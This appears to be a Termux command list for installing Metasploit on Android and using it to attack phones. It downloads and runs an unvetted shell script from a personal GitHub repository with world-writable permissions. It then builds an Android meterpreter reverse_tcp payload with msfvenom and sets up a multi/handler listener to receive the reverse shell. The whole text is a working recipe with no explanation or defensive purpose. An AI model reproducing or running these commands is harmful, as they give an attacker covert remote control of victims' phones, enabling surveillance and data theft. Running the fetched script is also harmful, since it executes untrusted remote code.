apt update
apt upgrade
pkg install python
pkg install python2
pkg install curl
curl -LO https://raw.githubusercontent.com/shadkhan786/metasploits/master/metasploit.sh
chmod 777 metasploit.sh
./metasploit.sh
msfvenom -p android/meterpreter/reverse_tcp LHOST=ip LPORT=port R > /sdcard/

msfconsole


use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST ip
set LPORT port
exploit

